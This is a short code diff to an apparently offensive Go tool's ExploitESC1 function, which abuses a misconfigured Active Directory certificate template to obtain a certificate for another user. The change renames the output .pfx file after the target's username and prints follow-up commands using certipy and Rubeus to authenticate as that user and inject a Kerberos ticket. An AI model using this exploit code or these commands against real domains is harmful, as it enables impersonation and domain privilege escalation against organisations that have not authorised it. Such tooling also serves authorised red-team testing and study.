@@ -411,10 +411,14 @@ func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 		return nil, nil, fmt.Errorf("enrollment failed: %w", err)
 	}
 
+	upnUser := targetUPN
+	if idx := strings.Index(upnUser, "@"); idx > 0 {
+		upnUser = upnUser[:idx]
+	}
 	fmt.Printf("[+] Certificate obtained for %s via ESC1 on template %q\n", targetUPN, templateName)
 	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy auth -pfx cert.pfx -dc-ip %s\n", cfg.TargetDC)
-	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:cert.pfx /ptt\n", targetUPN)
+	fmt.Printf("    certipy auth -pfx %s.pfx -dc-ip %s\n", upnUser, cfg.TargetDC)
+	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
 	return cert, certKey, nil
 }
 
